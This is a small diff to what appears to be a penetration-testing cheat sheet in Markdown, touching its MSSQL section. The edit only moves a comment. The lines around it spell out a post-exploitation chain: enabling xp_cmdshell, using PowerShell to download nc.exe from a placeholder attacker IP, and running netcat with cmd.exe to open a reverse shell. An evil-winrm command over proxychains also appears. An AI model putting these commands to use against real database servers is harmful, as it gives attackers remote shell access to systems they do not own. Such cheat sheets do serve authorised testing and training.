@@ -582,7 +582,8 @@ proxychains evil-winrm -i '<host>' -u '<username>'
 ### :open_file_folder: MSSQL
 
 ```mssql
-enable_xp_cmdshell /* sysadmin fixed server role */
+/* sysadmin fixed server role */
+enable_xp_cmdshell
 xp_cmdshell "powershell.exe wget http://<attacker ip>/nc.exe -OutFile c:\\Users\Public\\nc.exe"
 xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe <attacker ip> <attacker port>"
 ```
